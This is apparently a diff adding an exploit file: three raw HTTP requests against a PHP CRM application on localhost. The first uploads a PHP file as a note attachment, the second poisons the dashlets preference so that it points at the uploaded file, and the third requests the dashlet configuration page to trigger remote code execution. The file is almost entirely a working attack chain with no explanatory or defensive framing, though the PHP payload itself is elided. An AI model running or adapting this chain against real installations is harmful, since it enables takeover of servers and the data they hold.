@@ -1,0 +1,20 @@
+### 1) plant payload (multipart)
+POST /index.php HTTP/1.1
+Host: localhost:33116
+Content-Type: multipart/form-data; boundary=---
+Cookie: PHPSESSID=<sess>
+
+module=Notes&action=save&name=note_<rnd>  + file field uploadfile=<?php ... ?>
+
+### 2) poison preference
+POST /index.php HTTP/1.1
+Host: localhost:33116
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=<sess>
+
+module=Emails&action=EmailUIAjax&emailUIAction=setPreference&prefName=dashlets&prefValue[pwn][fileLocation]=upload/78409b64-b031-40bf-be1e-13cab15f11bc&prefValue[pwn][className]=stdClass
+
+### 3) trigger RCE
+GET /index.php?module=Emails&action=configuredashlet&id=pwn HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<sess>
